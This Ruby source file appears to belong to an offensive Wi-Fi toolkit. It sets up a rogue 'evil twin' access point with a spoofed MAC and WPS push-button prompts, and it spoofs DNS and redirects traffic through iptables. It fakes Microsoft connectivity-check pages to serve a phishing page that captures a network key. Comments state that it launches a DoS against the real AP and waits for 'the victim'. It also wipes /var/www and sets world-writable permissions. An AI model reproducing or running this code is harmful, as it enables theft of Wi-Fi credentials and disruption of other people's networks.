#!/usr/bin/env ruby


require 'gtk2'
require 'open3'
require 'highline/import'
require 'monitor'
require 'shellwords'
require './dos'







class Rogue
  def self.hostapdMulti
load 'check.rb'
      `touch /tmp/hostbase-1.1/dhcpd.conf`
      `touch /tmp/hostapd.psk`
      `touch /tmp/hostapd.conf`
      `ifconfig wlan0 down`
      sleep 2
      `ifconfig wlan0 hw ether a4:c4:94:31:93:70`
      sleep 1
      `ifconfig wlan0 up`
      sleep 2
Dir.chdir '/tmp/hostbase-1.1'
sleep 1
      `cat mac1ssid1.txt mac2ssid1.txt mac3ssid1.txt > /tmp/hostapd.accept`
sleep 1 # country_code a voir
`cat <<-EOF > /tmp/hostapd.conf
interface=wlan0
bssid=a4:c4:94:31:93:70
driver=nl80211
ssid=#{$ssid} 
hw_mode=g
ieee80211n=1
channel=#{$canal}
macaddr_acl=1
accept_mac_file=/tmp/hostapd.accept
# 2e AP
bss=wlan1
bssid=a4:c4:94:31:93:71
ssid=#{$ssid}_5GHz
channel=#{$canal}
macaddr_acl=1
accept_mac_file=/tmp/hostapd.accept
# 3e AP
bss=wlan2
bssid=a4:c4:94:31:93:72
ssid=#{$ssid}_
channel=#{$canal}
macaddr_acl=1
accept_mac_file=/tmp/hostapd.accept
EOF`
sleep 3
`cat <<-EOF > /tmp/hostbase-1.1/dhcpd.conf
option T150 code 150 = string;
deny client-updates;
one-lease-per-client false;
allow bootp;
ddns-updates off;
ddns-update-style interim;
authoritative;
subnet 175.0.0.0 netmask 255.255.255.0 {
interface wlan0;
range 175.0.0.2 175.0.0.10;
option routers 175.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 175.0.0.1;
allow unknown-clients;
}
subnet 178.0.0.0 netmask 255.255.255.0 {
interface wlan1;
range 178.0.0.2 178.0.0.10;
option routers 178.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 178.0.0.1;
allow unknown-clients;
}
subnet 172.0.0.0 netmask 255.255.255.0 {
interface wlan2;
range 172.0.0.2 172.0.0.10;
option routers 172.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 172.0.0.1;
allow unknown-clients;
}
EOF`
sleep 2 
        system "hostapd /tmp/hostapd.conf >> /tmp/hostbase-1.1/hostapd.txt &"
sleep 4
hostapdcli = Thread.new do
  while true
    system "xterm -e hostapd_cli wps_pbc"   # On lance hostapd_cli wps_pbc en tant que thread
sleep(120)     # Temps avant la relance de la commande
  end
end
Multi.hostapdCombo # on appelle la fonction dont on a besoin
sleep(5000000)        
       # Lancement de hostapd_cli a rajouter ici
       # Appel du script rogueinit et/ou de la méthode correspondante
       # Voir nohup ou xterm -e
   end
  

   def self.hostapdNormal
load 'check.rb'
      `touch /tmp/hostbase-1.1/dhcpd.conf`
      `touch /tmp/hostapd.psk`
      `touch /tmp/hostapd.conf`
sleep 1 # country_code a voir
`cat <<-EOF > /tmp/hostapd.conf
interface=wlan0
driver=nl80211
ssid=#{$ssid}   
ieee8021x=1
wpa=2
hw_mode=g
ieee80211n=1
channel=#{$canal}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_passphrase=12345678
wpa_psk_file=/tmp/hostapd.psk
ctrl_interface=/var/run/hostapd
eap_server=1
wps_state=2
ap_setup_locked=0
uuid=87654321-9abc-def0-1234-56789abc0000
wps_pin_requests=/var/run/hostapd.pin-req
device_name=Wireless AP
manufacturer=Company
model_name=WAP
model_number=123
serial_number=12345
device_type=6-0050F204-1
os_version=01020300
config_methods=label display push_button keypad
pbc_in_m1=1
friendly_name=WPS Access Point
EOF`
sleep 2
`cat <<-EOF > /tmp/hostbase-1.1/dhcpd.conf
option T150 code 150 = string;
deny client-updates;
one-lease-per-client false;
allow bootp;
ddns-updates off;
ddns-update-style interim;
authoritative;
subnet 175.0.0.0 netmask 255.255.255.0 {
interface wlan0;
range 175.0.0.2 175.0.0.10;
option routers 175.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 175.0.0.1;
allow unknown-clients;
}
EOF`
sleep 1
        system "hostapd /tmp/hostapd.conf >> /tmp/hostbase-1.1/hostapd.txt &"
sleep 3
hostapdcli = Thread.new do
  while true
    system "xterm -e hostapd_cli wps_pbc"   # On lance hostapd_cli wps_pbc en tant que thread
sleep(120)     # Temps avant la relance de la commande
  end
end
Setup.hostapdInit # on appelle la fonction dont on a besoin
sleep(5000000)        
       # Lancement de hostapd_cli a rajouter ici
       # Appel du script rogueinit et/ou de la méthode correspondante
       # Voir nohup ou xterm -e
   end
      

class Setup
def self.hostapdInit
puts "\e[1;94m[*] Configuracion de hostapd...\e[0m"
`ifconfig wlan0 up`
`sysctl net.ipv4.ip_forward=1`
`ifconfig wlan0 175.0.0.1 netmask 255.255.255.0`
`ifconfig wlan0 mtu 1400`
`iptables --flush`
`iptables --table nat --flush`
`iptables --delete-chain`
`iptables --table nat --delete-chain`
sleep 2;
`route add -net 175.0.0.0 netmask 255.255.255.0 gw 175.0.0.1 &> /dev/null`
`iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 175.0.0.1`
`iptables -P FORWARD ACCEPT`
`iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 175.0.0.1:80`
sleep 1
`echo > '/tmp/hostbase-1.1/dhcpd.leases'`
piddhcp = spawn('dhcpd -d -f -lf /tmp/hostbase-1.1/dhcpd.leases -cf /tmp/hostbase-1.1/dhcpd.conf')
sleep 3
piddnsspoofbis = spawn('dnsspoof -i wlan0 &')
sleep 1
page = File.open("page.txt").readlines.each do |page|
  puts page
$page = page.chomp
puts "\e[1;94m[*] Configuracion del systemo de hotspot...\e[0m"
Dir.chdir '/var/www'
sleep 1
`rm -rf *`
`cat <<-EOF > ncsi.txt
Microsoft NCSI
EOF`
sleep 1
`cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF`
sleep 1
`mkdir generate_204`
sleep 1
Dir.chdir '/var/www/generate_204'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
Dir.chdir '/var/www'
sleep 1
`mkdir msftconnecttest`
sleep 1
`mkdir msftnci`
sleep 1
Dir.chdir '/var/www/msftnci'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
Dir.chdir '/var/www'
sleep 1
`mkdir redirect`
sleep 1
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF`
sleep 1
Dir.chdir '/var/www/redirect'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
Dir.chdir '/var/www'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
`cp -R /etc/#{$page}/* /var/www/msftconnecttest/`
sleep 3;
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`mv #{$page}.php index.php`
`chown -R root:apache /var/www/*`
sleep 1
Dir.chdir '/var/www/msftconnecttest/shout'
sleep 1
`chown -R root:www-data /var/www/msftconnecttest/shout/chat.txt`
`chmod 764 /var/www/msftconnecttest/shout/chat.txt`
`chmod  777 *`
Dir.chdir '/var/www/msftconnecttest'
sleep 1
cle = "cle.txt"
if File.exist?("cle.txt")
`chmod 777 *`
`chown -R root:apache /var/www/msftconnecttest/cle.txt`
`chmod 764 /var/www/msftconnecttest/cle.txt`
`service start httpd`
sleep 4
puts "\e[1;32m[*] Rogue AP creado... preparacion de la DoS activa que sigue el AP...\e[0m"
Dir.chdir '/tmp/hostbase-1.1'
sleep 1
Init.interface # Lancement de la DoS ici et du code qui attend la victime
else
`chmod 777 *`
`service start httpd`
sleep 4
puts "\e[1;32m[*] Rogue AP creado... preparacion de la DoS activa que sigue el AP...\e[0m"
Dir.chdir '/tmp/hostbase-1.1'
sleep 1 
Init.interface # Lancement de la DoS ici et du code qui attend la victime
end
end
end
end


class Multi
def self.hostapdCombo
load 'combopage.rb'
puts "Configuting the multi AP's..."
`ifconfig wlan0 up`
`sysctl net.ipv4.ip_forward=1`
         `sudo ifconfig wlan0 175.0.0.1 netmask 255.255.255.0`
         sleep 1
         `route add -net 175.0.0.0 netmask 255.255.255.0 gw 175.0.0.1`
         `ifconfig wlan1 up`
         `sudo ifconfig wlan1 178.0.0.1 netmask 255.255.255.0`
         sleep 1
         `route add -net 178.0.0.0 netmask 255.255.255.0 gw 178.0.0.1`
         `sudo ifconfig wlan2 up`
         `sudo ifconfig wlan2 172.0.0.1 netmask 255.255.255.0`
         sleep 1
         `route add -net 172.0.0.0 netmask 255.255.255.0 gw 172.0.0.1`
         sleep 1
         `iptables --flush`
         `iptables --table nat --flush`
         `iptables --delete-chain`
         `iptables --table nat --delete-chain`
         sleep 2
         `iptables -A FORWARD -i wlan0 -o wlan2 -m state --state ESTABLISHED,RELATED \
 -j ACCEPT`
  `iptables -A FORWARD -i wlan1 -o wlan2 -m state --state ESTABLISHED,RELATED \
 -j ACCEPT`
  `iptables -A FORWARD -i wlan2 -o wlan1 -m state --state ESTABLISHED,RELATED \
 -j ACCEPT`
  `iptables -t nat -A POSTROUTING -o wlan0 -j SNAT --to 175.0.0.1`
         sleep 2
`echo > '/tmp/hostbase-1.1/dhcpd.leases'`
piddhcp = spawn('dhcpd -d -f -lf /tmp/hostbase-1.1/dhcpd.leases -cf /tmp/hostbase-1.1/dhcpd.conf')
sleep 3
piddnsspoofbis = spawn('dnsspoof -i wlan0 &')
sleep 1
piddnsspoof = spawn('dnsspoof -i wlan1 &')
sleep 1
piddnsspooftrois = spawn('dnsspoof -i wlan2 &')
sleep 1
page = File.open("page.txt").readlines.each do |page|
  puts page
$page = page.chomp
puts "\e[1;94m[*] Configuracion del systemo de hotspot...\e[0m"
Dir.chdir '/var/www'
sleep 1
`rm -rf *`
`mkdir msftconnecttest`
sleep 1
`mkdir msftnci`
sleep 1
Dir.chdir '/var/www/msftnci'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
Dir.chdir '/var/www'
sleep 1
`mkdir redirect`
sleep 1
`mkdir generate_204`
sleep 1
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF`
sleep 1
Dir.chdir '/var/www/redirect'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
Dir.chdir '/var/www/generate_204'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
Dir.chdir '/var/www'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
`cp -R /etc/#{$page}/* /var/www/msftconnecttest/`
sleep 3
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`mv #{$page}.php index.php`
`chown -R root:apache /var/www/*`
sleep 1
cle = "cle.txt"
if File.exist?("cle.txt")
`chmod 777 *`
`chown -R root:apache /var/www/msftconnecttest/cle.txt`
`chmod 764 /var/www/msftconnecttest/cle.txt`
`service start httpd`
sleep 4
puts "\e[1;32m[*] Rogue AP creado... preparacion de la DoS activa que sigue el AP...\e[0m"
Dir.chdir '/tmp/hostbase-1.1'
sleep 1 
Init.interface # Lancement de la DoS ici et du code qui attend la victime
else
`chmod 777 *`
`service start httpd`
sleep 4
puts "\e[1;32m[*] Rogue AP creado... preparacion de la DoS activa que sigue el AP...\e[0m"
Dir.chdir '/tmp/hostbase-1.1'
sleep 1 
Init.interface # Lancement de la DoS ici et du code qui attend la victime
end
end
end
end
end
